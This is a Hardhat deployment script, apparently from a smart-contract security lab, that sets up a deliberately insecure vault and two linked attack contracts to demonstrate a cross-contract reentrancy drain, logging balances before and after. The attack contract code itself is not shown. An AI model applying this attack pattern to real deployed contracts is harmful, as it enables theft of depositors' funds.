// scripts/exec-attack.js for Cross-Contract Reentrancy

const { ethers } = require("hardhat");

async function main() {
  const [deployer, user1, user2] = await ethers.getSigners();
  console.log("Deploying with:", deployer.address);

  // Deploy MoonToken
  const MoonToken = await ethers.getContractFactory("MoonToken");
  const token = await MoonToken.deploy();
  await token.deployed();
  console.log("MoonToken deployed at:", token.address);

  // Deploy InsecureMoonVault
  const Vault = await ethers.getContractFactory("InsecureMoonVault");
  const vault = await Vault.deploy(token.address);
  await vault.deployed();
  console.log("Vault deployed at:", vault.address);

  // Deploy Attack1 and Attack2
  const Attack1 = await ethers.getContractFactory("Attack1");
  const Attack2 = await ethers.getContractFactory("Attack2");

  const attack1 = await Attack1.deploy(vault.address);
  const attack2 = await Attack2.deploy(vault.address);

  await attack1.deployed();
  await attack2.deployed();
  console.log("Attack1 deployed at:", attack1.address);
  console.log("Attack2 deployed at:", attack2.address);

  // Set each other as peers
  await attack1.setPeer(attack2.address);
  await attack2.setPeer(attack1.address);
  console.log("Linked Attack1 <-> Attack2");

  // Users deposit ETH
  await vault.connect(user1).deposit({ value: ethers.utils.parseEther("3") });
  await vault.connect(user2).deposit({ value: ethers.utils.parseEther("2") });

  // Check vault balance
  let balance = await vault.getBalance();
  console.log("Vault balance before attack:", ethers.utils.formatEther(balance), "ETH");

  // Start the reentrancy attack
  console.log("Depositing 1 ETH into vault from both Attack1 and Attack2...");
  await attack1.attack({ value: ethers.utils.parseEther("1") });
  await attack2.attack({ value: ethers.utils.parseEther("1") });

  // Check final balances
  balance = await vault.getBalance();
  const attack1Bal = await ethers.provider.getBalance(attack1.address);
  const attack2Bal = await ethers.provider.getBalance(attack2.address);

  console.log("\n✅ Vault balance after attack:", ethers.utils.formatEther(balance), "ETH");
  console.log("💰 Attack1 balance after attack:", ethers.utils.formatEther(attack1Bal), "ETH");
  console.log("💰 Attack2 balance after attack:", ethers.utils.formatEther(attack2Bal), "ETH");
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
